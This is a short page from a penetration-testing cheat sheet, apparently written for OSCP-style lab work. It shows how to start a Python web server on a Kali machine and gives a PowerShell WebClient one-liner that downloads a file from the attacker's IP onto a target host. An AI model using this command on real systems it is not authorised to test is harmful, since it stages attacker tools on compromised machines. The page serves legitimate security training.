---
title: Powershell File Transfer
layout: default
nav_order: 6
parent: File Transfers

---

# Powershell
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }
1. TOC
{:toc}

---

### Powershell File Transfers
Transfer file from target to Kali machine:

Setup webserver on Kali machine:
```bash
python3 -m http.server 80
```

Grab download from target:
```powershell
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
```

*NOTE: Change the `http://10.11.0.4/wget.exe` parameter with desired IP address of the Kali machine and the destination parameter `C:\Users\offsec\Desktop\wget.exe` with desired destination*